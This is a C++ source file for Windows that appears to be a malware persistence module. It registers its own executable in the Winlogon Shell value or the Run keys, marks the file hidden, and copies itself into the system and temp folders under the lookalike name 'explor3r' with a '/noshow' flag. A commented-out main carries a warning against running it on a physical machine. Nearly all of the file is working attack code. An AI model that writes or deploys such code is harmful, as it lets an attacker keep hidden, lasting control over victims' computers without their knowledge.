#include                    "regOnWin.h"
#pragma warning(disable:4996)

using namespace				std;

HKEY h_key;
long l_key;
bool w_good;

bool RegOnWin(char ** c_path){

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_ROOT_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
	long l_set_key = NULL;
	if (l_key == ERROR_SUCCESS) { // if we get the admin's priviledge, we can use the shell start-up and bypass the start-up check
		char * full_path = new char[MAX_PATH + 50];
		sprintf(full_path, "explorer.exe,\"%s \"", c_path);
		long l_set_key = RegSetValueEx(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);

		if (l_set_key == ERROR_SUCCESS)
			w_good = true;
		printf("write on explorer.exe\n");

		RegCloseKey(h_key);
	}

	if (!w_good) {
		// Adding to start-up since we couldn't use the Shell start-up.
		l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

		// No admin access. Just make it user startup.
		if (l_key == ERROR_ACCESS_DENIED) {
			l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
		}

		if (l_key == ERROR_SUCCESS) {
			char * full_path = new char[MAX_PATH + 50];
			sprintf(full_path, "\"%s\"", c_path);
			printf("write on user reg success\n");
			long l_set_key = RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
			RegCloseKey(h_key);
		}

	}

	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
	if (w_good || l_set_key == ERROR_SUCCESS)
		return true;
	else
		return false;
}
void WinChange(bool show){
	HWND hWnd = GetForegroundWindow();
	while (1){
		if (GetAsyncKeyState(VK_SPACE)) ShowWindow(hWnd, show), Sleep(100), show = !show;
		Sleep(50);
	}
}

void SaveValueReg(const char *path, const char *key,
	const char *value) {
	// set value in register
	HKEY hKey;
	HKEY hKey2;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
		KEY_SET_VALUE, &hKey);

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);

	if (hKey != NULL) {
		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char *)value,
			MAX_PATH);
	}
	if (hKey2 != NULL) {
		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char *)value,
			MAX_PATH);
	}

	RegCloseKey(hKey);
	RegCloseKey(hKey2);
}

void Persistence(std::string appName) {
	// copy value in system
	HMODULE module_handler = GetModuleHandle(NULL);
	char file_path[MAX_PATH];
	char system_path[MAX_PATH];
	char system_path_reg[MAX_PATH] = "\"";
	char tmp_path[MAX_PATH];
	char tmp_path_reg[MAX_PATH] = "\"";

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	strcat(system_path_reg, system_path);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(tmp_path_reg, tmp_path);

	strcat(system_path_reg, ("\\" + appName + ".exe\" /noshow").c_str());
	strcat(system_path, ("\\" + appName + ".exe").c_str());
	CopyFile(file_path, system_path, true);

	printf("system_path:%s", system_path);

	strcat(tmp_path_reg, (appName + ".exe\" /noshow").c_str());
	strcat(tmp_path, (appName + ".exe").c_str());
	CopyFile(file_path, tmp_path, true);

	printf("tmp_path:%s", tmp_path);

	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "1").c_str(), system_path_reg);
	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "2").c_str(), tmp_path_reg);

}

/*
void main(){
	HMODULE h_mod;
	bool show = 0;
	char *	c_path[MAX_PATH];
	std::string appName = "explor3r";
	//WinChange(show);
	h_mod = GetModuleHandleW(NULL);
	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);
	bool success = RegOnWin(c_path);
	if (success)
		printf("example on write Reg success!\n");
	else
		printf("Oops, something wrong happened!\n");
	Persistence(appName); //don't uncomment this function on your physical machine
	system("pause");
}*/